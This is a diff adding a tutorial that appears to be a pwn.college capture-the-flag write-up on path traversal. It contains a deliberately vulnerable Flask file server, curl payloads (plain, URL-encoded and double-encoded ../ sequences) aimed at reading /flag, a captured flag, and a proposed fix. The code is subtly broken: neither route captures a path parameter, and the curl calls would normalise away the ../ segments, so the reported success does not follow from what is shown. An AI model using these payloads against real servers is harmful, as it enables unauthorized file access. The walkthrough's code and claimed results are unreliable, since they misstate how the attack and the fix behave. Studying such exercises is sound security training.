@@ -1,0 +1,85 @@
+Exploiting Path Traversal Vulnerabilities: A Step-by-Step Guide
+Introduction
+Path traversal is a common web vulnerability that allows attackers to access files outside the intended directory. In this guide, we'll explore how to exploit and prevent this vulnerability using a real-world example.
+
+The Challenge
+The challenge involves a Flask-based web server that serves files from the /challenge/files directory. The server is vulnerable to path traversal due to improper handling of user input in the URL path.
+
+Server Code
+
+#!/opt/pwn.college/python
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+@app.route("/files", methods=["GET"])
+@app.route("/files/", methods=["GET"])
+def challenge(path="index.html"):
+    requested_path = app.root_path + "/files/" + path
+    print(f"DEBUG: {requested_path=}")
+    try:
+        return open(requested_path).read()
+    except PermissionError:
+        flask.abort(403, requested_path)
+    except FileNotFoundError:
+        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
+    except Exception as e:
+        flask.abort(500, requested_path + ":" + str(e))
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+    
+Exploiting the Vulnerability
+The server naively appends user input to the base path without proper sanitization. This allows attackers to use ../ sequences to traverse outside the intended directory.
+
+Step 1: Basic Traversal
+Use ../ to access the /flag file:
+
+
+curl -v 'http://challenge.localhost/files/../../../flag'
+    
+Step 2: URL Encoding
+If the server blocks ../, encode the characters:
+
+
+curl -v 'http://challenge.localhost/files/%2e%2e/%2e%2e/%2e%2e/flag'
+    
+Step 3: Double URL Encoding
+Encode the encoded characters for additional obfuscation:
+
+
+curl -v 'http://challenge.localhost/files/%252e%252e/%252e%252e/%252e%252e/flag'
+    
+Success! The server returns the flag:
+
+pwn.college{kFeBqDfZ2mcjwPYYEYCnn0te6iQ.ddDOzMDL1AjM5MzW}
+        
+Preventing Path Traversal
+To fix this vulnerability, the server should sanitize user input and ensure resolved paths are within the base directory. Here's an example of secure code:
+
+
+from pathlib import Path
+
+BASE_DIR = Path(app.root_path) / "files"
+
+@app.route("/files", methods=["GET"])
+@app.route("/files/", methods=["GET"])
+def challenge(path="index.html"):
+    requested_path = (BASE_DIR / path).resolve()
+    if not requested_path.is_relative_to(BASE_DIR):
+        flask.abort(403, "Access denied")
+    try:
+        return open(requested_path).read()
+    except PermissionError:
+        flask.abort(403, "Permission denied")
+    except FileNotFoundError:
+        flask.abort(404, f"File not found: {requested_path}")
+    except Exception as e:
+        flask.abort(500, str(e))
+    
+Conclusion
+Path traversal vulnerabilities are dangerous but preventable. By understanding how they work and implementing proper input validation, developers can secure their applications against such attacks.
+
+Note: Always test vulnerabilities in a controlled environment and with proper authorization.
